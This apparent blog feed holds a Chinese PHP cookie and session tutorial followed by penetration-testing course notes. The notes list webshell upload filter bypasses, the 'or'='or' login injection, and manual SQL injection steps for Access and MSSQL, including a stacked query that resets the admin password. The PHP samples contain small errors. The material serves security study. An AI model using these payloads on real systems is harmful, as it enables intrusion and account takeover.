<tr>
<td>$name</td>
<td style="text-align:left">Cookie的识别名称</td>
<td style="text-align:left">使用$_COOKIE[‘cookiename’]调用名为cookiename的Cookie</td>
</tr>
<tr>
<td>$value</td>
<td style="text-align:left">Cookie的值，可以为数值或字符串形态，此值保存在客户端，不要用来保存敏感数据</td>
<td style="text-align:left">假定第一个参数为‘cookiename’，可以通过$_COOKIE[‘cookiename’]取得其值</td>
</tr>
<tr>
<td>$expire</td>
<td style="text-align:left">Cookie的生成期限，这是个Unix时间戳，即从Unix纪元开始的秒数</td>
<td style="text-align:left">如time()+60<em>60</em>24*7将设定Cookie在一周后失效，如果未设定cookie,则会在会话结束后就立即失效</td>
</tr>
<tr>
<td>$panth</td>
<td style="text-align:left">Cookie在服务器端的指定路径，当设定此值时，服务器中只有指定路径下的网页或程序可以存取此Cookie</td>
<td style="text-align:left">如果该参数设为“/”的话，cookie就在整个domain内有效，如果设为‘/foo’,cookie就只在domain下的/foo/目录及其子目录内有效，默认值为设定cookie的当前目录</td>
</tr>
<tr>
<td>$domain</td>
<td style="text-align:left">指定此Cookie所属服务器的网址名称，预设是建立此Cookie服务器的网址</td>
<td style="text-align:left">要使cookie能在如example.com域名下所有子域名都有效的话，该参数应该设为“.example.com”。虽然“.”并不是必须的，但加上它会兼容更多浏览。如果该参数设置为www.example.com的话，就只在www子域内有效</td>
</tr>
<tr>
<td>$secure</td>
<td style="text-align:left">指明Cookie是否仅通过安全的HTTPS连接传送中Cookie的安全识别常数，如果设定此值代表只有在某种情况下，才能在客户端与服务器之间传递</td>
<td style="text-align:left">当设成TRUE时，Cookie仅在安全的连接中被设置。默认值为FALSE</td>
</tr>
</tbody>
</table>
<p>如果只有name这一个参数，则原有此名称的Cookie选项将会被删除，可以使用空字符串（“ ”）来略过此参数。参数expire和secure是个整数，可以使用0来略过参数，而不是使用空字符串。但参数expire是一个正规的Unix时间整数，由time()或mktime()函数传回。参数secure指出此Cookie将只有在安全的HTTPS连接时传送。在实际建立Cookie是通常仅使用前三项参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	setcookie(&quot;username&quot;,&quot;test&quot;,time()+60*60*24*7);			//向客户端发送一个Cookie</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>全部参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	setcookie(&quot;username&quot;,&quot;test&quot;,time()+60*60*24*7，&quot;/test&quot;,&quot;.example.com&quot;,1);			//使用全部参数设置</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="在PHP脚本中读取Cookie的资料内容"><a href="#在PHP脚本中读取Cookie的资料内容" class="headerlink" title="在PHP脚本中读取Cookie的资料内容"></a>在PHP脚本中读取Cookie的资料内容</h3><p>在设置Cookie的脚本中，第一次读取它的信息并不会生效，必须刷新或到下一个页面才可以看到Cookie值，因为Cookie要先被设置到客户端，再次访问时才能被发送回来，这时才能被获取。所以要测试一个Cookie是否被成功的设定，可以在其到期之前通过另一个页面来访问其值。可以简单地使用print_r(_COOKIE)指令来调试现有的Cookies。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	print_r($_COOKIE);			//输出Cookie中保存的所有用户信息</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="数组形态的Cookie应用"><a href="#数组形态的Cookie应用" class="headerlink" title="数组形态的Cookie应用"></a>数组形态的Cookie应用</h3><p>Cookie也可以利用多维数组的形式，将多个内容值存储在相同Cookie名称标识符下。但不能直接使用setCookie()函数，将数组变量插入到第二个参数作为Cookie的值，因为setCookie()函数的第二个参数必须传一个字符串的值。如果需要将数组变量设置到Cookie中，可以在setCookie()函数的第二个参数中，通过在Cookie标识名称中指定数组下标的形式设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	setcookie(&quot;user[username]&quot;,&quot;username&quot;);				//设置为$_COOKIE[&quot;user&quot;][&quot;username&quot;]</div><div class="line">	setcookie(&quot;user[password]&quot;,&quot;md5(&quot;123456&quot;)&quot;);		//设置为$_COOKIE[&quot;user&quot;][&quot;password&quot;]</div><div class="line">	setcookie(&quot;user[email]&quot;,&quot;test@example.com&quot;);		//设置为$_COOKIE[&quot;user&quot;][&quot;email&quot;]</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>用forecho()函数遍历Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	forecho($_COOKIE[&quot;user&quot;]as $key=&gt;$value)&#123;</div><div class="line">		echo $key.&quot;:&quot;.$value.&quot;\n&quot;;</div><div class="line">		&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h3><p>删除保存在客户端的Cookie，可以使用两种方法。第一种方法，省略setcookie()函数所有参数列，仅导入第一个参数cookie识别名称参数，来删除指定名称的Cookie资料；第二种方式，利用setcookie()函数，把目标Cookie设定为“已过期”状态。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	//只指定Cookie识别名称一个参数，即删除客户端中这个指定名称的Cookie资料</div><div class="line">	setCookie(&quot;Account&quot;);		//第一种方法</div><div class="line">	//设置Cookie在当前时间之前已经过期，因此系统会自动删除识别名称isLogin的Cookie</div><div class="line">	setCookie(&quot;isLogin&quot;,&quot;&quot;,time()-1);		//第二种方法</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="Session的应用"><a href="#Session的应用" class="headerlink" title="Session的应用"></a>Session的应用</h2><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>Session技术是将使用者相关的资料存放在服务器的系统之下，所以使用者无法停止Session的使用。<br>在客户端仅需要保存由服务器为用户创建的一个Session标识符，称为Session ID;而在服务器端保存Session变量的值。Session ID是一个既不会重复，又不容易被找到规律的，由32位十六进制数组成的字符串。Session ID会保存在客户端的Cookie里，如果用户阻止Cookie的使用，则可以将Session ID保存在用户浏览器地址栏的URL中。当用户请求Web服务器时，就会把Session ID发送给服务器，再通过Session ID提取保存在服务器中的Seesion变量。可以把Session中保存的变量，当做是这个用户的全局变量，同一个用户对每个脚本的访问都共享这些变量。<br>当某个用户向Web服务器发出请求时，服务器首先会检查这个客户端的请求里是否已经包含了一个Session ID。如果包含，说明之前已经为此用户创建过Session，服务器则按该Session ID把Session检索出来使用。如果客户端请求不包含Session ID，则为该用户创建一个Session，并且生成一个与此Session关联的Session ID,在本次响应中被传送给客户端保存。<br>Session是存放与服务器之中，为了避免对服务器系统造成过大的负荷，因此Session并不像Cookie是一种半永久性的存在。Session会因为下面两种状况而自然消失。</p>
<ul>
<li>第一个状况，当使用者关闭浏览器，失去与服务器之间的连接之后，Session即会自动消失。而当使用者下次登入网址时，再另行配置一个Session使用。</li>
<li>第二种状况，Session指定的有效期限到期。一般而言PHP系统中对于Session的生存时间并无定义，也就是说预设值为零。可以通过修改php.ini配置文件中有关“session.cookie.lift_time”项目，来设定Session的有效期限，以秒为单位指定了发送给浏览器的Cookie的生命周期。值为0表示“直到关闭浏览器”，默认为0.当系统赋予Session有效期限后，不管浏览器是否开启，Session都会自动消失。</li>
</ul>
<h3 id="配置Session"><a href="#配置Session" class="headerlink" title="配置Session"></a>配置Session</h3><table>
<thead>
<tr>
<th>选项名</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td>session.auto_start</td>
<td style="text-align:left">自动启动会话，0标识禁用，1表示开启</td>
<td style="text-align:left">0</td>
</tr>
<tr>
<td>session.cache_expire</td>
<td style="text-align:left">为缓存中的会话页设置当前时间，单位分钟</td>
<td style="text-align:left">180</td>
</tr>
<tr>
<td>session.cookie_domain</td>
<td style="text-align:left">指定会话Cookie中的域</td>
<td style="text-align:left">none</td>
</tr>
<tr>
<td>session.cookie_lifetime</td>
<td style="text-align:left">Cookie中的Session ID在客户机上保存的时间，0标识延续到浏览器关闭时</td>
<td style="text-align:left">0</td>
</tr>
<tr>
<td>session.cookie_path</td>
<td style="text-align:left">在会话Cookie中要设置的路径</td>
<td style="text-align:left">/</td>
</tr>
<tr>
<td>seesion.name</td>
<td style="text-align:left">会话的名称，在客户端用做Cookie的标识名称</td>
<td style="text-align:left">PHPSESSID</td>
</tr>
<tr>
<td>session.save_path</td>
<td style="text-align:left">会话在服务器存储的路径</td>
<td style="text-align:left">/tmp</td>
</tr>
<tr>
<td>seesion.use_cookies</td>
<td style="text-align:left">配置在客户端使用Cookie的会话，1表示允许</td>
<td style="text-align:left">1</td>
</tr>
</tbody>
</table>
<h3 id="Session的声明与使用"><a href="#Session的声明与使用" class="headerlink" title="Session的声明与使用"></a>Session的声明与使用</h3><p>Session的设置不同于Cookie，必须先启动，在PHP中必须调用session_start()函数，以便让PHP核心程序，将和Session相关的内建环境变量预先载入至内存中。seesion_star()函数的语法格式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool session_start(void)		//创建Session,开始一个会话，进行Session初始化</div></pre></td></tr></table></figure></p>
<p>函数Session_start()有两个作用，一是开始一个会话，二是返回已经存在的会话。这个函数没有参数，且返回值均为TRUE。</p>
<h3 id="注册一个会话变量和读取Session"><a href="#注册一个会话变量和读取Session" class="headerlink" title="注册一个会话变量和读取Session"></a>注册一个会话变量和读取Session</h3><p>注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION关联数组中农工的键名具有和PHP中普通变量名相同的命名规则。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	session_start();			//启动Session的初始化</div><div class="line">	$_SESSION[&quot;username&quot;]=&quot;admin&quot;;			//注册Session变量，赋值为一个用户的名称</div><div class="line">	$_SESSION[&quot;password&quot;]=&quot;123456&quot;;			//注册Session变量，赋值为一个用户的密码</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>Seesion变量的文件的内容结构：</p>
<pre><code>变量名|类型:长度:值;        //每个变量都使用相同的结构保存
</code></pre><h3 id="注销变量与销毁Session"><a href="#注销变量与销毁Session" class="headerlink" title="注销变量与销毁Session"></a>注销变量与销毁Session</h3><p>销毁和当前Session有关的所以资料，可以调用session_destroy()函数结束当前的会话，并清空会话中的所有资源。该函数的语法格式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool session_destroy(void)		//销毁和当前Session有关的所有资料</div></pre></td></tr></table></figure></p>
<p>该函数用来关闭Session的运作，如果成功则传回TRUE，销毁Session资料失败则返回false.但该函数并不会释放和当前的Session相关的变量，也不会删除保存在客户端Cookie中的Session ID.因为$_SESSION数组和自定义的数组在使用上是相同的，所以我们可以使用unset()函数释放在Session中注册的单个变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">unset($_SESSION[&quot;username&quot;]);		//删除在Sesssion中注册的用户名变量</div><div class="line">unset($_SESSION[&quot;password&quot;]);		//删除在Session中注册的用户密码变量</div></pre></td></tr></table></figure></p>
<p>不要使用unset($_SESSION)删除整个$_SESSION数组，这样将不能再通过$_SESSION超全局数组注册变量了。但如果想把某个用户在Session中注册的所有变量都删除，可以直接将数组变量$_SESSION赋上一个空数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_SESSION=array();			//将某个用户在Session中注册的变量全部清除</div></pre></td></tr></table></figure></p>
<p>在PHP脚本中，可以通过调用session_name()函数获取Session名称。删除保存在客户端Cookie中的Session ID.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	if(isset($_COOKIE[session_name()]))&#123;			//判断Cookie中是否保存Session ID</div><div class="line">			setcookie(session_name(),&quot;&quot;,time()-3600,&quot;/&quot;);		//删除包含Session ID的Cookie</div><div class="line">			&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>Session的注销过程共需要四个步骤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    	 //第一步：开启Session并初使化</div><div class="line">	session_start();       </div><div class="line">     	//第二步：删除所有Session的变量，也可用unset($_SESSION[xxx])逐个删除</div><div class="line">	$_SESSION = array();   </div><div class="line">	//第三步：如果使用基于Cookie的Session，使用setCooike()删除包含Session Id的Cookie</div><div class="line">	if (isset($_COOKIE[session_name()])) &#123;</div><div class="line">   		setcookie(session_name(), &apos;&apos;, time()-42000, &apos;/&apos;);</div><div class="line">	&#125;</div><div class="line">	//第四步：最后彻底销毁Session</div><div class="line">	session_destroy();</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="传递Session-ID"><a href="#传递Session-ID" class="headerlink" title="传递Session ID"></a>传递Session ID</h3><p>使用Session跟踪一个用户，是通过在各个方面之间传递唯一的Session ID，并通过Session ID提取这个用户在服务器中保存的Session。常见的Session ID传送方法有以下两种。</p>
<ul>
<li>第一种方法是基于Cookie的方式传递Session ID，这种方法更优化，但由于不总是可用，因为用户在客户端可以屏蔽Cookie。</li>
<li>第二种方法则是通过URL参数进行传递，直接将会话ID嵌入到URL中。</li>
</ul>
<h4 id="通过Cookie传递Session-ID"><a href="#通过Cookie传递Session-ID" class="headerlink" title="通过Cookie传递Session ID"></a>通过Cookie传递Session ID</h4><p>如果客户端没有禁用Cookie，则在PHP脚本中通过session_start()函数进行初始化后，服务器会自动发送HTTP标头将Session ID保存到客户端电脑的Cookie中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setCookie(session_name(),session_id(),0,&apos;/&apos;)			//虚拟向Cookie中设置Session ID的过程</div></pre></td></tr></table></figure></p>
<ul>
<li>在第一个参数中调用session_name()函数，返回当前Session的名称做为Cookie的标识名称。Session名称的默认值为PHPSESSID，是在php.ini文件中由session.name选项指定的值。也可以调用session_name()函数时提供参数改变当前Session名称。</li>
<li>在第二个参数中调用session_id()函数，返回当前Session ID作为Cookie的值。也可以通过调用session_id()函数时提供参数设定当前Session ID</li>
<li>第三个参数的值0，是通过在php.ini文件中由session.cookie_lifetime选项设置的值。默认值为0，表示Session ID将在客户机的Cookie中延续到浏览器关闭</li>
<li>最后一个参数“/”，表示在Cookie中要设置的路径在整个域内都有效</li>
</ul>
<h4 id="通过URL传递Session-ID"><a href="#通过URL传递Session-ID" class="headerlink" title="通过URL传递Session ID"></a>通过URL传递Session ID</h4><p>PHP可以重写客户请求的URL，把SessionID添加到URL信息中。可以手动地在每个超链接的URL中都添加一个SessionID,但工作量比较大，不建议使用这种方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	session_start();</div><div class="line">	echo&apos;&lt;a href=&quot;demo.php?&apos;.session_name().&apos;=&apos;.session_id().&apos;&quot;&gt;链接演示&lt;/a&gt;;</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[安全牛：Kali Linux渗透测试-整理笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/%E5%AE%89%E5%85%A8%E7%89%9B%EF%BC%9AKali-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/1622444d95f1718371.png" alt="安全牛"></p>
<a id="more"></a>
<h2 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h2><h3 id="NETCAT-NC"><a href="#NETCAT-NC" class="headerlink" title="NETCAT-NC"></a>NETCAT-NC</h3><ul>
<li>监听模式/传输模式</li>
<li>telnet/获取banner信息</li>
<li>传输文本信息</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>远程克隆硬盘</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[安全牛：网络渗透与深度防御视频-整理笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/%E5%AE%89%E5%85%A8%E7%89%9B%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E4%B8%8E%E6%B7%B1%E5%BA%A6%E9%98%B2%E5%BE%A1%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/1622444d95f1718371.png" alt="安全牛"></p>
<a id="more"></a>
<h2 id="Web加固"><a href="#Web加固" class="headerlink" title="Web加固"></a>Web加固</h2><h3 id="IIS加固"><a href="#IIS加固" class="headerlink" title="IIS加固"></a>IIS加固</h3><ul>
<li>日志:更改默认日志的路径.记录:cookies 协议版本</li>
<li>权限:只读,脚本资源访问<br>主目录</li>
<li>删除所有不需要的脚本扩展名:主目录:asp </li>
<li>向客户端发送以下消息:处理URL出错:<br>主目录–配置–调试</li>
<li>限定访问后台的IP:目录安全性</li>
<li>删除所有自定义错误:防止被挂马</li>
</ul>
<h3 id="防止数据下载"><a href="#防止数据下载" class="headerlink" title="防止数据下载"></a>防止数据下载</h3><ul>
<li>修改数据库名,和默认路径</li>
<li>数据库重定向到主页</li>
<li>防暴库：conn.asp:on error resume next</li>
</ul>
<h3 id="NTFS-小到大"><a href="#NTFS-小到大" class="headerlink" title="NTFS:小到大"></a>NTFS:小到大</h3><ul>
<li>删除所有权限。</li>
<li>给administrator完全控制权限</li>
<li>给IIS_WPG  完全控制</li>
<li>给IUSR_HOSTNAME 只读</li>
</ul>
<h3 id="终级防网马-webshell"><a href="#终级防网马-webshell" class="headerlink" title="终级防网马:webshell"></a>终级防网马:webshell</h3><p> 能写不能执行,能执行不能写入</p>
<ul>
<li>哪些目录需要写入权限:data uploadfile uploadface<br>databackup—&gt;iusr_heixia</li>
<li>在IIS中给以下目录拒绝执行权限</li>
</ul>
<h2 id="常用攻击方法"><a href="#常用攻击方法" class="headerlink" title="常用攻击方法"></a>常用攻击方法</h2><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>  #：%23<br>  %：%25<br>  空格：%20<br>  www.xx.com/bbs/a.asp?id=1<br>  ‘<br>  id=a<br>   id=999999<br>   第二个/替换为%5c<br>   id[]=1<br>   apsx:~a.asp<br>   jsp:%81,原代码，<br>  .JSP<br>  .js%2527<br>  www.xx.com/abc.asp加不存在页面</p>
<p>  数据库密码技巧<br>  Log日志文件  登录日志</p>
<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><ul>
<li><p>无任何限制：<br>　　直接上传</p>
</li>
<li><p>限制后缀：黑名单 asp,asax<br>　　突破：a.cer,a.cdx</p>
</li>
<li><p>后缀替换为空：<br>a.aaspsp<br>　a.asaspp</p>
</li>
<li><p>mine.types:<br>　a.php.rar.rar.rar</p>
</li>
<li><p>a.asp. a#2easp</p>
</li>
<li><p>windows2003解析漏洞：<br>建立文件夹：a.asp<br>里面放任何文件都会解析为.asp</p>
</li>
<li><p>文件改名为：a.asp;.jpg</p>
<p>8.本地验证：<br>前台上传webshell  记录webshell路径<br>后台数据库备份修改后缀</p>
</li>
</ul>
<h2 id="手工注入Access"><a href="#手工注入Access" class="headerlink" title="手工注入Access"></a>手工注入Access</h2><h3 id="注入成因"><a href="#注入成因" class="headerlink" title="注入成因"></a>注入成因</h3><p>程序对用户输入的字符没有进行过滤</p>
<h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>万能密码（参数查询不适用）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or&apos;=&apos;or&apos;</div></pre></td></tr></table></figure>
<p>原因分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">登录语句：</div><div class="line">select * from admin where username =&apos;$username&apos; and password=&apos;$password&apos;</div><div class="line"></div><div class="line">插入 &apos;or&apos;=&apos;or&apos;,语句变为：</div><div class="line">select * from admin where username =&apos;&apos;or&apos;=&apos;or&apos;&apos; and password=&apos;$password&apos;</div><div class="line"></div><div class="line">or 前面的单引号用于闭合原语句的单引号，此时username等于空，此时&apos;=&apos;判断为true，</div><div class="line">再与username或判断为true，第二个or后的单引号用于闭合。</div></pre></td></tr></table></figure>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">www.xx.com/a.asp?id=1</div><div class="line">and 1=1 返回正常</div><div class="line">and 1=2 返回错误</div></pre></td></tr></table></figure>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">and (select count(*) from 数据库独有表名)&gt;0</div><div class="line">count:统计数据库表个数</div></pre></td></tr></table></figure>
<p>附加:</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th style="text-align:left">数据库独有表名</th>
</tr>
</thead>
<tbody>
<tr>
<td>access</td>
<td style="text-align:left">mssysobjects</td>
</tr>
<tr>
<td>mssql</td>
<td style="text-align:left">sysbojects</td>
</tr>
<tr>
<td>mysql</td>
<td style="text-align:left">infomation_schema.tables</td>
</tr>
<tr>
<td>oracle</td>
<td style="text-align:left">sys.user_tables</td>
</tr>
</tbody>
</table>
<h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">and (select count(*) from admin) &gt;0</div><div class="line"></div><div class="line">返回正常 说明admin表存在</div><div class="line">返回错误 说明admin表不存在</div></pre></td></tr></table></figure>
<h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">and (select count(admin_user) from admin) &gt;0</div><div class="line"></div><div class="line">将*换成你需要猜的列名即可</div><div class="line">返回正常 说明admin表存在列admin_user</div><div class="line">返回错误 说明admin表不存在列admin_user</div></pre></td></tr></table></figure>
<h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><p>判断长度函数：len(admin_user) </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">and (select len(admin_user) from admin)&gt;4   返回正常</div><div class="line">and (select len(admin_user) from admin)&lt;5	返回错误</div><div class="line"></div><div class="line">说明当前密码长度为5</div></pre></td></tr></table></figure>
<h3 id="判断值"><a href="#判断值" class="headerlink" title="判断值"></a>判断值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">left(admin_user,1)=&apos;a&apos;  判断左边起一个字符是否为a</div><div class="line"></div><div class="line">and (select left(admin_user,1) from admin)=&apos;a&apos;</div><div class="line">and (select left(admin_user,2) from admin)=&apos;ad&apos; 左边起前两个是否为ad</div></pre></td></tr></table></figure>
<h2 id="手工注入MSSQL"><a href="#手工注入MSSQL" class="headerlink" title="手工注入MSSQL"></a>手工注入MSSQL</h2><h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">and 1=1;    返回正常</div><div class="line">and 1=2;	返回错误</div><div class="line">and @@version&gt;0   判断版本</div></pre></td></tr></table></figure>
<h3 id="查看当前连接数据库的用户名"><a href="#查看当前连接数据库的用户名" class="headerlink" title="查看当前连接数据库的用户名"></a>查看当前连接数据库的用户名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">and user&gt;0</div><div class="line">返回：</div><div class="line">dbo=sa mssql管理员</div><div class="line">端口 1433</div></pre></td></tr></table></figure>
<h3 id="查看当前连接数据库"><a href="#查看当前连接数据库" class="headerlink" title="查看当前连接数据库"></a>查看当前连接数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and db_name()&gt;0</div></pre></td></tr></table></figure>
<h3 id="查看其他数据库"><a href="#查看其他数据库" class="headerlink" title="查看其他数据库"></a>查看其他数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">and (select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&lt;&gt;0</div><div class="line"></div><div class="line">说明：</div><div class="line">sysdatabases里面存储的是一些系统信息，包括所有数据库的名字。</div><div class="line">Dbid就是数据库的id，dbid的值从1到5被系统占用，所以其他数据库是从6开始的</div><div class="line">将name与1比较，类型转换错误也就爆出了数据库的名字。将dbid的值从6开始试下去，就得到了所有的库名</div></pre></td></tr></table></figure>
<h3 id="判断表名-1"><a href="#判断表名-1" class="headerlink" title="判断表名"></a>判断表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">and (select top 1 name from sysbojects where xtype=&apos;u&apos; and status&gt;0)&gt;0</div><div class="line"></div><div class="line">说明：</div><div class="line">sysbojects是SQLServer的系统表，存储着所有的表名、视图、约束及其他对象，</div><div class="line">其中&quot;xtype=&apos;u&apos; and status&gt;0&quot;表示用户建立的表名</div><div class="line">上面的语句将第一个表名取出，与0比较大小，让错误信息把表名报出来</div></pre></td></tr></table></figure>
<h3 id="判断其他表"><a href="#判断其他表" class="headerlink" title="判断其他表"></a>判断其他表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select top 1 name from sysbojects where xtype=&apos;u&apos; and status&gt;0 and name not in (&apos;已猜出表&apos;))&gt;0</div></pre></td></tr></table></figure>
<h3 id="判断列名-1"><a href="#判断列名-1" class="headerlink" title="判断列名"></a>判断列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</div><div class="line"></div><div class="line">说明：</div><div class="line">第一字段为&quot;ID&quot;，用object_id(表名)能获取表名对应的内部ID。</div><div class="line">col_name(表名ID，1)代表该表的第1个字段名，将1换乘2，3，4...</div><div class="line">就可以逐个获取所猜解表里面的所有字段名</div></pre></td></tr></table></figure>
<h3 id="判断值-1"><a href="#判断值-1" class="headerlink" title="判断值"></a>判断值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">and (select username from admin)&gt;0</div><div class="line">and (select password from admin)&gt;0</div></pre></td></tr></table></figure>
<h3 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">;update 库名.abo.admin表 set password=&apos;a123456&apos; where username=&apos;admin&apos;;--</div><div class="line">--: 注释符</div></pre></td></tr></table></figure>
